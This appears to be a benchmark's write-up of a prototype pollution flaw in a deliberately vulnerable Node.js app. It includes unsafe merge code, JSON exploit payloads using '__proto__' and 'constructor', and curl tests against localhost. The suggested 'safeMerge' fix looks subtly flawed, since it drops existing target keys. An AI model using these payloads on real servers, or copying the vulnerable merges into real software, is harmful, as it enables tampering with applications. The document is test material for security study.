# Prototype Pollution Vulnerability

## Description
This vulnerability allows an attacker to modify the prototype of JavaScript objects through malicious user input. The application has two vulnerable components:
1. Template System - Uses unsafe recursive object merging
2. Settings System - Uses vulnerable Object.assign implementation

## Impact
- **Severity**: High
- **CVSS Score**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Attack Scenarios
1. **Global Object Pollution**: Attackers can modify Object.prototype to affect all objects
2. **Function Prototype Pollution**: Can modify Function.prototype to affect all functions
3. **Constructor Pollution**: Can modify object constructors to affect new instances
4. **Nested Pollution**: Can pollute deeply nested objects

## Vulnerable Components

### 1. Template System
Location: `src/models/template.js`

Vulnerable code:
```javascript
function mergeTemplates(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = mergeTemplates(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

### 2. Settings System
Location: `src/models/settings.js`

Vulnerable code:
```javascript
function updateSettings(newSettings) {
  Object.assign(globalSettings, newSettings);
}
```

## Example Exploits

### 1. Basic Prototype Pollution
```http
POST /api/template
Content-Type: application/json

{
  "name": "Malicious Template",
  "__proto__": {
    "polluted": "Yes"
  }
}
```

### 2. Constructor Pollution
```http
POST /api/settings/update
Content-Type: application/json

{
  "constructor": {
    "prototype": {
      "polluted": "Yes"
    }
  }
}
```

### 3. Nested Pollution
```http
POST /api/template
Content-Type: application/json

{
  "name": "Nested Attack",
  "properties": {
    "a": {
      "b": {
        "__proto__": {
          "polluted": "Yes"
        }
      }
    }
  }
}
```

## Testing
1. Run the test suite:
```bash
python test/test_prototype_pollution.py
```

2. Manual testing with curl:
```bash
# Test basic pollution
curl -X POST http://localhost:3001/api/template \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"polluted":"yes"}}'

# Verify pollution
curl http://localhost:3001/api/template/settings
```

## Mitigation
To fix this vulnerability:
1. Validate object keys before merging
2. Use Object.create(null) for clean objects
3. Implement safe merge functions
4. Use JSON schema validation

Example safe merge:
```javascript
function safeMerge(target, source) {
  const result = {};
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor') continue;
    if (typeof source[key] === 'object') {
      result[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      result[key] = source[key];
    }
  }
  return result;
}
```

## References
- [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')](https://cwe.mitre.org/data/definitions/1321.html)
- [OWASP - Prototype Pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)
- Source: benchmark-nodejs collection-bench 